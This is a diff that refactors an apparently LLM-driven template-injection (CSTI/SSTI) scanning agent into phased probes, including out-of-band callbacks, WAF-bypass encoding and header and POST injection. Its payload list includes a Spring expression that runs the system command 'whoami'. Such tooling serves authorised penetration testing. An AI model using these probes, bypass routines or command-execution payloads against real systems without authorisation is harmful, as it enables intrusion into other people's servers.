@@ -710,6 +710,87 @@ Response format (XML):
 
         return parsed_items
 
+
+    async def _test_parameter(self, session: "aiohttp.ClientSession", item: Dict, html: str) -> List[Dict]:
+        """Test a single parameter for CSTI/SSTI vulnerabilities."""
+        param = item.get("parameter")
+        if not param:
+            return []
+
+        param_findings = []
+        engines = TemplateEngineFingerprinter.fingerprint(html)
+        logger.info(f"[{self.name}] Detected engines: {engines}")
+
+        # Phase 1: LLM Smart Analysis
+        if engines != ["unknown"]:
+            smart_findings = await self._run_llm_smart_analysis(session, param, engines, html)
+            param_findings.extend(smart_findings)
+
+        if self._max_impact_achieved or len(param_findings) >= 2:
+            return param_findings
+
+        # Phase 2: Targeted Probing
+        if engines != ["unknown"]:
+            finding = await self._targeted_probe(session, param, engines)
+            if finding:
+                param_findings.append(finding)
+                self._record_bypass_result(finding["payload"], success=True)
+
+        # Phase 3: Universal Probe
+        finding = await self._universal_probe(session, param)
+        if finding:
+            param_findings.append(finding)
+            self._record_bypass_result(finding["payload"], success=True)
+
+        # Phase 4: OOB Probe
+        finding = await self._oob_probe(session, param, engines)
+        if finding:
+            param_findings.append(finding)
+            self._record_bypass_result(finding["payload"], success=True)
+
+        # Phase 5: POST Injection
+        finding = await self._test_post_injection(session, param, engines)
+        if finding:
+            param_findings.append(finding)
+
+        # Phase 6: Header Injection (rare)
+        if not param_findings:
+            finding = await self._test_header_injection(session, engines)
+            if finding:
+                param_findings.append(finding)
+
+        # Phase 7: LLM Advanced Bypass (fallback)
+        if self._detected_waf and not param_findings:
+            finding = await self._llm_probe(session, param)
+            if finding:
+                param_findings.append(finding)
+
+        return param_findings
+
+    async def _run_llm_smart_analysis(self, session, param: str, engines: List[str], html: str) -> List[Dict]:
+        """Run LLM smart analysis and test payloads."""
+        findings = []
+        interact_url_param = self.interactsh.get_url(f"csti_{param}") if self.interactsh else ""
+        smart_payloads = await self._llm_smart_template_analysis(html, param, engines, interact_url_param)
+
+        for sp in smart_payloads:
+            if self._max_impact_achieved:
+                break
+
+            success_content, verified_url = await self._test_payload(session, param, sp["code"])
+            if success_content:
+                finding_obj = self._create_finding(param, sp["code"], "llm_smart_analysis", verified_url=verified_url)
+                finding = self._finding_to_dict(finding_obj)
+                findings.append(finding)
+
+                should_stop, reason = self._should_stop_testing(sp["code"], success_content, len(findings))
+                if should_stop:
+                    dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
+                    break
+
+        return findings
+
+
     async def run_loop(self) -> Dict:
         dashboard.current_agent = self.name
         dashboard.log(f"[{self.name}] 🚀 Starting Template Injection analysis", "INFO")
@@ -717,113 +798,21 @@ Response format (XML):
         all_findings = []
 
         try:
-            # Improved Phase: Prioritize params
             self.params = self._prioritize_params(self.params)
-
-            # Phase 0: WAF Detection
             await self._detect_waf_async()
-
-            # Phase 1: Setup Interactsh for OOB
             await self._setup_interactsh()
 
             async with aiohttp.ClientSession() as session:
+                html = await self._fetch_page(session)
+
                 for item in self.params:
-                    # Victory Hierarchy Check
                     if self._max_impact_achieved:
                         dashboard.log(f"[{self.name}] 🏆 Max impact achieved, skipping remaining params", "SUCCESS")
                         break
 
-                    param = item.get("parameter")
-                    if not param:
-                        continue
-                    
-                    # Local param loop tracking
-                    param_findings = []
+                    param_findings = await self._test_parameter(session, item, html)
+                    all_findings.extend(param_findings)
 
-                    # Phase 2: Engine Fingerprinting
-                    html = await self._fetch_page(session)
-                    engines = TemplateEngineFingerprinter.fingerprint(html)
-                    logger.info(f"[{self.name}] Detected engines: {engines}")
-
-                    # Phase 2.5: LLM Smart Analysis (PRIMARY)
-                    if engines != ["unknown"]:
-                        interact_url_param = self.interactsh.get_url(f"csti_{param}") if self.interactsh else ""
-                        smart_payloads = await self._llm_smart_template_analysis(
-                            html, param, engines, interact_url_param
-                        )
-
-                        for sp in smart_payloads:
-                            if self._max_impact_achieved:
-                                break
-                            
-                            # Filter logic: If we know the engine, skip mismatches
-                            # But allow 'unknown' payloads or if detection was fuzzy
-                            
-                            success_content, verified_url = await self._test_payload(session, param, sp["code"])
-                            if success_content:
-                                finding_obj = self._create_finding(param, sp["code"], "llm_smart_analysis", verified_url=verified_url)
-                                finding = self._finding_to_dict(finding_obj)
-                                
-                                all_findings.append(finding)
-                                param_findings.append(finding)
-
-                                should_stop, reason = self._should_stop_testing(sp["code"], success_content, len(param_findings))
-                                if should_stop:
-                                    dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
-                                    break
-                    
-                    if self._max_impact_achieved or len(param_findings) >= 2: # Quick continue if smart won
-                        continue
-
-                    # Phase 3: Targeted Probing
-                    if engines != ["unknown"]:
-                        finding = await self._targeted_probe(session, param, engines)
-                        if finding:
-                            all_findings.append(finding)
-                            param_findings.append(finding)
-                            self._record_bypass_result(finding["payload"], success=True)
-                            
-                            # Check impact (assume targeted probe returns logic success, we need content ideally, 
-                            # but existing structure makes it hard. We can assume found=1 is start)
-                            # Actually, we should refactor targeted_probe to return content too, 
-                            # but for now rely on the loop continuation logic.
-                            if self._max_impact_achieved: continue
-
-                    # Phase 4: Universal + Polyglot Probing
-                    finding = await self._universal_probe(session, param)
-                    if finding:
-                        all_findings.append(finding)
-                        param_findings.append(finding)
-                        self._record_bypass_result(finding["payload"], success=True)
-
-                    # Phase 5: OOB (Blind SSTI)
-                    finding = await self._oob_probe(session, param, engines)
-                    if finding:
-                        all_findings.append(finding)
-                        param_findings.append(finding)
-                        self._record_bypass_result(finding["payload"], success=True)
-
-                    # Phase 5.5: POST Injection
-                    finding = await self._test_post_injection(session, param, engines)
-                    if finding:
-                         all_findings.append(finding)
-                         param_findings.append(finding)
-
-                    # Phase 5.6: Header Injection (rare)
-                    if not all_findings: # Only if nothing found yet
-                        finding = await self._test_header_injection(session, engines)
-                        if finding:
-                             all_findings.append(finding)
-                             param_findings.append(finding)
-
-                    # Phase 6: LLM Advanced Bypass (Legacy Fallback)
-                    if self._detected_waf and not param_findings:
-                         finding = await self._llm_probe(session, param)
-                         if finding:
-                             all_findings.append(finding)
-                             param_findings.append(finding)
-
-            # Cleanup
             if self.interactsh:
                 await self.interactsh.deregister()
 
@@ -1143,55 +1132,77 @@ Response format (XML):
             String con el nuevo payload, o None si no se pudo generar
         """
         logger.info(f"[CSTIAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
-        
+
         tried_variants = tried_variants or []
-        
-        # Detectar el motor del payload original
         current_engine = self._detect_engine_from_payload(original_payload)
         logger.info(f"[CSTIAgent] Detected engine from payload: {current_engine}")
-        
-        # Estrategia 1: Si hay WAF, usar encoding inteligente
-        if waf_signature and waf_signature.lower() != "no identificado":
-            logger.info(f"[CSTIAgent] WAF detected ({waf_signature}), using intelligent encoding...")
-            
-            encoded_variants = self._get_encoded_payloads([original_payload])
-            for variant in encoded_variants:
-                if variant not in tried_variants and variant != original_payload:
-                    logger.info(f"[CSTIAgent] Generated WAF bypass variant: {variant[:80]}...")
-                    return variant
-        
-        # Estrategia 2: Si hay caracteres filtrados, usar encoding de plantilla
-        if stripped_chars:
-            logger.info(f"[CSTIAgent] Characters filtered ({stripped_chars}), using template encoding...")
-            
-            encoded = self._encode_template_chars(original_payload, list(stripped_chars))
-            if encoded not in tried_variants and encoded != original_payload:
-                logger.info(f"[CSTIAgent] Generated encoded variant: {encoded[:80]}...")
-                return encoded
-        
-        # Estrategia 3: Probar con motor alternativo
+
+        # Try strategies in order
+        variant = self._try_waf_bypass(original_payload, waf_signature, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._try_char_encoding(original_payload, stripped_chars, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._try_engine_switch(current_engine, tried_variants)
+        if variant:
+            return variant
+
+        variant = self._try_universal_payloads(tried_variants)
+        if variant:
+            return variant
+
+        logger.warning("[CSTIAgent] Could not generate new variant (all strategies exhausted)")
+        return None
+
+    def _try_waf_bypass(self, original_payload: str, waf_signature: Optional[str], tried_variants: List[str]) -> Optional[str]:
+        """Try WAF bypass encoding strategy."""
+        if not waf_signature or waf_signature.lower() == "no identificado":
+            return None
+
+        logger.info(f"[CSTIAgent] WAF detected ({waf_signature}), using intelligent encoding...")
+        encoded_variants = self._get_encoded_payloads([original_payload])
+
+        for variant in encoded_variants:
+            if variant not in tried_variants and variant != original_payload:
+                logger.info(f"[CSTIAgent] Generated WAF bypass variant: {variant[:80]}...")
+                return variant
+        return None
+
+    def _try_char_encoding(self, original_payload: str, stripped_chars: Optional[str], tried_variants: List[str]) -> Optional[str]:
+        """Try character encoding strategy."""
+        if not stripped_chars:
+            return None
+
+        logger.info(f"[CSTIAgent] Characters filtered ({stripped_chars}), using template encoding...")
+        encoded = self._encode_template_chars(original_payload, list(stripped_chars))
+
+        if encoded not in tried_variants and encoded != original_payload:
+            logger.info(f"[CSTIAgent] Generated encoded variant: {encoded[:80]}...")
+            return encoded
+        return None
+
+    def _try_engine_switch(self, current_engine: str, tried_variants: List[str]) -> Optional[str]:
+        """Try alternative engine payload."""
         alternative_payload = self._try_alternative_engine(current_engine)
+
         if alternative_payload and alternative_payload not in tried_variants:
             logger.info(f"[CSTIAgent] Generated alternative engine variant: {alternative_payload[:80]}...")
             return alternative_payload
-        
-        # Estrategia 4: Payloads universales avanzados
+        return None
+
+    def _try_universal_payloads(self, tried_variants: List[str]) -> Optional[str]:
+        """Try universal CSTI payloads."""
         universal_csti = [
-            "{{7*7}}",  # Jinja2/Twig
-            "${7*7}",   # Freemarker/Thymeleaf
-            "#{7*7}",   # Ruby ERB
-            "<%= 7*7 %>",  # ERB
-            "{{= 7*7 }}",  # Pebble
-            "${{7*7}}",    # Velocity
-            "{{7*'7'}}",   # Alternative arithmetic
-            "{{config}}",  # Jinja2 config leak
-            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",  # Spring SSTI
+            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{= 7*7 }}",
+            "${{7*7}}", "{{7*'7'}}", "{{config}}",
+            "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
         ]
-        
+
         for variant in universal_csti:
             if variant not in tried_variants:
                 logger.info(f"[CSTIAgent] Generated universal variant: {variant[:80]}...")
                 return variant
-        
-        logger.warning("[CSTIAgent] Could not generate new variant (all strategies exhausted)")
         return None
